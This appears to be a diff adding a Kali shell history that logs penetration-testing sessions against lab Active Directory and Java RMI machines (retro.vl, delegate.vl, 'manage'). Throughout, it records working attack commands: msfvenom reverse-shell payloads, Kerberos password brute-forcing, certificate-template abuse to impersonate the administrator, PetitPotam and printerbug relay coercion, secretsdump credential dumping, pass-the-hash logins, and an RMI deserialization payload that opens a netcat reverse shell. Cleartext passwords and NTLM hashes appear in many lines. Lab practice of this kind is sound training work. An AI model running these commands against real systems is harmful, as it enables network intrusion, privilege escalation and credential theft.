+emulate bash -c '. /home/kali/.cache/pypoetry/virtualenvs/model-fiVc6LrG-py3.12/bin/activate'
+python preprocess.py
+exit
+msfconsole -q
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=443 -f exe -o met.exe
+cd tools
+git clone https://github.com/ly4k/SpoolFool.git
+cd SpoolFool
+ls
+evil-winrm -i 10.10.11.106 -u tom -p liltony 
+evil-winrm -i 10.10.11.106 -u tony -p liltony 
+cd tools/SpoolFool
+ls
+evil-winrm -i 10.10.11.106 -u tony -p liltony 
+cd
+evil-winrm -i 10.10.11.106 -u tony -p liltony
+exit
+smbclient -L 10.10.121.68
+smbclient \\\\10.10.121.68\\Trainees
+file Important.txt
+exiftool Important.txt
+nxc smb 10.10.121.68 -u usernames.txt -p usernames.txt
+smbclient \\\\10.10.121.68\\Notes -U trainee
+cat ToDo.txt
+../../../tools/kerbrute
+../../../tools/kerbrute bruteuser
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt 'BANKING$' --dc dc.retro.vl
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt 'BANKING$' -d dc.retro.vl
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt 'BANKING$' -d dc.retro.vl --dc dc.retro.vl
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt 'BANKING$' -d retro.vl --dc dc.retro.vl
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt 'BANKING$' -d retro.vl --dc dc.retro.vl -t 50
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt 'BANKING$' -d retro.vl --dc retro.vl -t 50
+../../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt BANKING -d retro.vl --dc retro.vl -t 50
+nxc smb 10.10.121.68 -u BANKING -p ''
+nxc smb 10.10.121.68 -u BANKING -p '' --shares
+nxc ldap 10.10.121.68 -u BANKING -p '' 
+evil-winrm -i 10.10.121.68 -u BANKING -p ''
+evil-winrm -i 10.10.121.68 -u BANKING -p '' -M laps
+nxc ldap 10.10.121.68 -u BANKING -p '' -M laps
+impacket-secretsdump BANKING@10.10.121.68
+mkdir blood; cd blood
+bloodhound-python -d 'retro.vl' -u BANKING -p '' -ns 10.10.121.68
+bloodhound-python -d 'retro.vl' -u trainee -p 'trainee' -ns 10.10.121.68
+certipy find -u BANKING -p '' -target retro.vl -text -stdout -vulnerable
+certipy find -u BANKING -target retro.vl -text -stdout -vulnerable
+certipy find -u BANKING -target retro.vl -text -stdout -vulnerable -debug
+certipy find -u BANKING -target retro.vl -text -stdout -vulnerable -h
+certipy find -u BANKING -target retro.vl -text -stdout -vulnerable -ns 10.10.121.68
+certipy find -u BANKING -target retro.vl -text -stdout -vulnerable -ns 10.10.121.68 -debug
+certipy find -u trainee -target retro.vl -text -stdout -vulnerable -ns 10.10.121.68 -debug
+certipy find -u trainee -target retro.vl -text -stdout -vulnerable 
+certipy find -u trainee -target retro.vl -text -stdout -vulnerable
+certipy find -u trainee -target dc.retro.vl -text -stdout -vulnerable
+certipy find -u trainee -target dc.retro.vl -text -stdout -vulnerable -ns 10.10.121.68
+certipy req -u 'BANKING$' -p '' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING$' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+certipy req -u 'trainee' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING$' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+rpcclient -U 'BANKING$%' -N 10.10.121.68 -c "setcomputerpassword BANKING 'new_password'"\
+
+rpcclient -U 'BANKING$' -N 10.10.121.68 -c "setcomputerpassword BANKING 'new_password'"
+rpcclient -U 'BANKING$'  10.10.121.68 -c "setcomputerpassword BANKING 'new_password'"
+rpcclient -U 'BANKING$' -W retro.vl 10.10.121.68 -c "setcomputerpassword BANKING 'new_password'"
+rpcclient -U 'BANKING' -W retro.vl 10.10.121.68 -c "setcomputerpassword BANKING 'new_password'"
+rpcclient -U 'BANKING' -N 10.10.121.68 -c "setcomputerpassword BANKING 'new_password'"
+rpcclient -U 'BANKING$%' -N 10.10.121.68 -c "setcomputerpassword BANKING 'P@ssw0rd123'"\
+
+rpcclient -U 'BANKING' -N 10.10.121.68 -c "setcomputerpassword BANKING 'P@ssw0rd123'"\
+
+rpcclient -U 'trainee' -N 10.10.121.68 -c "setcomputerpassword BANKING 'P@ssw0rd123'"\
+
+rpcclient -U 'trainee' 10.10.121.68 -c "setcomputerpassword BANKING 'P@ssw0rd123'"\
+
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"\
+
+bloodyAD --host "10.10.121.68" -d "RETRO.VL" -u "BANKING" -p "" set password "BANKING" "NewPassword"
+bloodyAD --host "10.10.121.68" -d "RETRO.VL" -u "BANKING" set password "BANKING" "NewPassword"
+bloodyAD --host "10.10.121.68" -d "RETRO.VL" -u "BANKING" -no-pass set password "BANKING" "NewPassword"
+bloodyAD --host "10.10.121.68" -d "RETRO.VL" -u "BANKING" -N set password "BANKING" "NewPassword"
+bloodyAD --host "10.10.121.68" -d "RETRO.VL" -u "BANKING" set password "BANKING" "NewPassword"
+bloodyAD --host "10.10.121.68" -d "RETRO.VL" -u "BANKING" -p ' ' set password "BANKING" "NewPassword"
+export KRB5CCNAME=/home/kali/.nxc/modules/pre2k/ccache/banking.ccache
+certipy req -u 'BANKING' -k -no-pass -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING\retro.vl' -k -no-pass -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING\retro.vl' -k -no-pass -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns dc.retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING\retro.vl' -k -no-pass -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING\retro.vl' -k -no-pass -target dc.retro.vl -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dc-ip 10.10.121.68
+certipy req -u 'BANKING\retro.vl' -k -no-pass -target dc.retro.vl -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dc-ip 10.10.121.68 -key-size 4096
+certipy req -u 'BANKING\retro.vl' -k -no-pass -target dc.retro.vl -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -dns DC.retro.vl -dc-ip 10.10.121.68 -key-size 4096
+certipy auth -pfx administrator_dc.pfx -domain retro.vl -username administrator -dc-ip 10.10.121.68
+evil-winrm -i 10.10.121.68 -u administrator -H aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
+evil-winrm -i 10.10.121.68 -u administrator -H 252fac7066d93dd009d4fd2cd0368389
+nxc ldap 10.10.121.68 -u BANKING -p ''
+nxc ldap 10.10.121.68 -u BANKING -p '' -M adcs
+nxc ldap 10.10.121.68 -u trainee -p 'trainee' -M adcs
+nxc ldap 10.10.121.68 -u trainee -p 'trainee' -M adcs -L
+nxc ldap 10.10.121.68 -u trainee -p 'trainee' -M pre2k
+nc -lnvp 443
+stty raw -echo ; fg
+wget https://raw.githubusercontent.com/repo4Chu/pswm-decoder/refs/heads/main/pswm-decoder.py
+python3 pswm-decoder.py
+pip3 install cryptocode
+pip3 install cryptocode --break-system-packages
+python3 pswm-decoder.py
+subl pswm-decoder.py
+echo 'e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==' > pswm
+python3 pswm-decoder.py
+nmap -T4 -sVC 10.10.106.209
+nmap -T4 -sVC -Pn 10.10.106.209
+ping 10.10.106.209
+nmap -T4 -sVC -Pn 10.10.106.209
+nc -lnvp 443
+nano rev.sh
+python3 -m http.server 80
+rm rev.sh
+rm pswm
+rm pswm-decoder.py
+ping 10.10.116.54
+nmap -T4 -sVC -Pn 10.10.116.54
+rmg
+cd vulnlab/machines
+mkdir manage
+cd manage
+git clone https://github.com/qtc-de/remote-method-guesser
+cd remote-method-guesser
+mvn package
+mvn
+cd ..
+wget https://github.com/qtc-de/remote-method-guesser/releases/download/v5.1.0/rmg-5.1.0-jar-with-dependencies.jar
+java -jar rmg-5.1.0-jar-with-dependencies.jar
+java -jar rmg-5.1.0-jar-with-dependencies.jar guess 10.10.116.54 2222
+java -jar rmg-5.1.0-jar-with-dependencies.jar call 10.10.116.54 2222 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar 
+sudo apt install maven -y\
+
+cd remote-method-guesser
+mvn package
+rmg 
+ls
+sudo mvn package
+rmg
+ls
+ls -al
+ls -al *
+java -jar /home/kali/vulnlab/machines/manage/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar
+java -jar /home/kali/vulnlab/machines/manage/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar enum 10.10.116.54 2222
+java -jar /home/kali/vulnlab/machines/manage/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar guess 10.10.116.54 2222
+java -jar /home/kali/vulnlab/machines/manage/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar serial 10.10.116.54 2222 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
+java -jar /home/kali/vulnlab/machines/manage/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar serial 10.10.116.54 2222 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name jmxrmi --signature "String execute(String dummy)"
+java -jar /home/kali/vulnlab/machines/manage/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar enum 10.10.116.54 2222
+cd ..
+git clone https://github.com/qtc-de/beanshooter
+cd bn
+cd beanshooter
+ls
+mvn package
+ls
+ls target
+cd t
+cd target
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.116.54 2222
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.116.54 2222
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.116.54 2222 tonka
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.116.54 2222
+nc -lnvp 443
+stty raw -echo ; fg
+adduser -h
+sudo adduser root\
+
+sudo responder -I tun0\
+
+cd ../SeDelegatePrivilege
+cd ../PetitPotam
+python3 PetitPotam.py 10.8.4.204 10.10.92.50 -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
+cd ../SeDelegatePrivilege
+python3 krbrelayx/printerbug.py delegate.vl/'UwU$'@dc1.delegate.vl UwU.delegate.vl
+smbclient -L 10.10.92.50
+smbclient \\\\10.10.92.50\\SYSVOL
+smbclient \\\\10.10.92.50\\NETLOGON
+cat users.bat
+echo 'P4ssw0rd1#123' > passwords.txt
+impacket-lookupsid anonymous@10.10.92.50
+impacket-lookupsid anonymous@10.10.92.50 | grep -i user > usernames.txt
+subl usernames.txt
+nxc ldap 10.10.92.50 -u A.Briggs -p 'P4ssw0rd1#123'
+nxc ldap 10.10.92.50 -u A.Briggs -p 'P4ssw0rd1#123' -M laps
+mkdir blood; cd blood
+nxc ldap 10.10.92.50 -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All
+sudo subl /etc/hosts
+nxc ldap 10.10.92.50 -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All
+sudo subl /etc/hosts
+nxc ldap 10.10.92.50 -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All
+nxc ldap DC1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All
+nxc ldap DC1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All -h
+nxc ldap DC1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All -d delegate.vl
+nxc ldap DC1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound --collection All -d delegate.vl --dns-server 10.10.92.50
+cp /home/kali/.nxc/logs/DC1_10.10.92.50_2024-12-31_114943_bloodhound.zip .
+sudo neo4j start
+bloodhound
+cd
+cd cptc
+ls
+cd Princess-Sumaya-University-for-Technology
+ls
+cd Useful\ Tools
+ls
+cd linWinPwn
+ls
+sudo bash install.sh
+cd
+cd tools
+ls
+cd krbrelayx
+ls
+python3 dnstool.py 
+history | grep addspn.py
+python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.7 -t A
+cd
+cd vulnlab/machines/Delegate
+git clone https://github.com/overgrowncarrot1/SeDelegatePrivilege.git
+cd SeDelegatePrivilege
+ls
+python Delegate.py -l 10.8.4.204 -r 10.10.92.50 -c realuser -p TestPassword321 -d delegate.vl -dc dc1.delegate.vl -u N.Thompson -P KALEB_2341 -N C7BE3644A2EB37C9BB1F248E9E0B9AFC
+subl Delegate.py
+python Delegate.py -l 10.8.4.204 -r 10.10.92.50 -c realuser -p TestPassword321 -d delegate.vl -dc dc1.delegate.vl -u N.Thompson -P KALEB_2341 -N C7BE3644A2EB37C9BB1F248E9E0B9AFC
+subl Delegate.py
+ls
+ls krbrelayx
+python Delegate.py -l 10.8.4.204 -r 10.10.92.50 -c realuser -p TestPassword321 -d delegate.vl -dc dc1.delegate.vl -u N.Thompson -P KALEB_2341 -N C7BE3644A2EB37C9BB1F248E9E0B9AFC
+python Delegate.py -l 10.8.4.204 -r 10.10.92.50 -c carrot -p TestPassword321 -d delegate.vl -dc dc1.delegate.vl -u N.Thompson -P KALEB_2341 -N C7BE3644A2EB37C9BB1F248E9E0B9AFC
+s
+ls
+python Delegate.py -l 10.8.4.204 -r 10.10.92.50 -c carrot -p TestPassword321 -d delegate.vl -dc dc1.delegate.vl -u N.Thompson -P KALEB_2341 -N C7BE3644A2EB37C9BB1F248E9E0B9AFC
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC\
+
+ls
+python Delegate.py -l 10.8.4.204 -r 10.10.92.50 -c realuser -p TestPassword321 -d delegate.vl -dc dc1.delegate.vl -u N.Thompson -P KALEB_2341 -N C7BE3644A2EB37C9BB1F248E9E0B9AFC
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC\
+
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC
+cd ..
+git clone https://github.com/topotam/PetitPotam\
+
+cd PetitPotam
+ls
+python3 PetitPotam.py 10.8.4.204 10.10.92.50
+python3 PetitPotam.py 10.8.4.204 10.10.92.50 -h
+python3 PetitPotam.py 10.8.4.204 10.10.92.50 -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
+cd ../SeDelegatePrivilege
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC --target dc1.delegate.vl
+cat /etc/hosts
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC --target DC1.delegate.vl
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC --target delegate.vl
+python3 krbrelayx/krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC --target DC1.delegate.vl
+ls
+pwd
+export KRB5CCNAME=/home/kali/vulnlab/machines/Delegate/SeDelegatePrivilege/DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
+impacket-secretsdump -k -no-pass dc1.DELEGATE.VL
+impacket-psexec administrator@dc1.DELEGATE.VL -hashes aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93
+impacket-wmiexec administrator@dc1.DELEGATE.VL -hashes aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93
+python3 krbrelayx/printerbug.py 'realuser$:TestPassword321'@10.10.92.50 realuser.delegate.vl
+python3 krbrelayx/printerbug.py 'carrot$:TestPassword321'@10.10.92.50 realuser.delegate.vl
+python3 krbrelayx/printerbug.py 'realuser$:TestPassword321'@10.10.92.50 realuser.delegate.vl
+python3 krbrelayx/printerbug.py 'carrot$:TestPassword321'@10.10.92.50 carrot.delegate.vl
+python3 krbrelayx/printerbug.py 'realuser$:TestPassword321'@10.10.92.50 realuser.delegate.vl
+python3 krbrelayx/printerbug.py 'realuser$:TestPassword321'@10.10.92.50 realuser.delegate.vl\
+NEW\
+
+ping 10.10.92.50
+ping 10.10.99.236
+evil-winrm -i DC1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+cd targetedKerberoast
+ls
+python3 targetedKerberoast.py -v -d 'delegate.vl' -u A.Briggs -p 'P4ssw0rd1#123'
+nano hash
+hashcat -a 0 hash /usr/share/wordlists/rockyou.txt
+evil-winrm -i DC1.delegate.vl -u N.Thompson -p 'KALEB_2341'
+cp '/var/run/vmblock-fuse/blockdir/Px9d0f/1.jpg' .
+cp '/var/run/vmblock-fuse/blockdir/xEB4qF/2.jpg' .
+cp '/var/run/vmblock-fuse/blockdir/xGb6O1/3.jpg' .
+cp '/var/run/vmblock-fuse/blockdir/LODN6o/4.jpg' .
+ssh -N -D 0.0.0.0:9999 pentest@10.10.206.6
+ssh -D 0.0.0.0:9999 pentest@10.10.206.6
+ssh -R 999 pentest@10.10.206.6
+ssh -R 9988 pentest@10.10.206.6
+ls
+ping 10.10.206.5
+sudo nano /etc/proxychains4.conf
+proxychains -q nmap -T5 -F -Pn 10.10.206.5
+sudo nano /etc/proxychains4.conf
+proxychains -q nmap -T5 -F -Pn 10.10.206.5
+proxychains -q nmap -T5 -Pn 10.10.206.5
+proxychains -q nmap -T5 -Pn 10.10.206.6
+proxychains -q nmap -T5 -Pn 10.10.206.5
+cd ..
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.206.0/24 dev ligolo\
+
+cd tools
+cd li
+cd ligolo
+ls
+./proxy -selfcert -laddr 0.0.0.0:443
+sudo ip route add 10.10.157.0/24 dev ligolo
+./proxy -selfcert -laddr 0.0.0.0:443
+bash ../../ligolo-clean.sh
+cd 
+cd cp
+subl usernames.txt
